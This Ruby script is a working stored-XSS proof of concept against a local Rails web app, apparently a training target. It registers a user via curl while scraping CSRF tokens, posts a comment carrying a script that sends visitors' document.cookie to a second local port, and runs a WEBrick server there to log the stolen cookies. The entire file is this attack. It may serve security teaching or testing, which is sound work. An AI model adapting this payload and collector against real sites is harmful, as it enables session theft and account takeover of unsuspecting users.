require "cgi"

require 'webrick'

log_file = File.open 'tmp/webrick.log', 'a+'
log = WEBrick::Log.new log_file

username = Kernel.rand(99999)

cookie_jar = "tmp/1-cookie-jar-#{username}"

puts username, cookie_jar

puts "get session"

def get_csrf cookie_jar
  resp = `curl -4 -i --silent -c #{cookie_jar} -b #{cookie_jar} "http://localhost:3000"`

  resp.match(/content="(.+?)" name="csrf-token"/)[1] rescue puts resp
end

puts "create user"

csrf = get_csrf cookie_jar

resp = `curl -4 -i --silent -c #{cookie_jar} -b #{cookie_jar} -X POST -d "user[username]=#{username}" -d "authenticity_token=#{CGI.escape csrf}" -d "user[password]=#{username}" "http://localhost:3000/users"`

csrf = get_csrf cookie_jar

puts "post XSS extraction comment"
xss = CGI.escape %Q|<script>var img=document.createElement("img");img.src="http://localhost:3001/?cookie="+document.cookie;document.body.appendChild(img);</script>|
`curl -4 --silent -b #{cookie_jar} -c #{cookie_jar} -X POST -d "comment[comment]=#{xss}" -d "authenticity_token=#{CGI.escape csrf}" -d "comment[cat]=6672150457_420d61007d_b.jpg" "http://localhost:3000/comments"`


server = WEBrick::HTTPServer.new :Port => 3001, :AccessLog => [[log,WEBrick::AccessLog::COMBINED_LOG_FORMAT]], :Logger => log
trap 'INT' do server.shutdown end

server.mount_proc '/' do |req, res|
  puts "-----------------------"
  puts req.path + "?" + req.query_string
  puts "-----------------------"
  res.body = ''
end

puts "wait for cookie contents from local web server via XSS..."

server.start
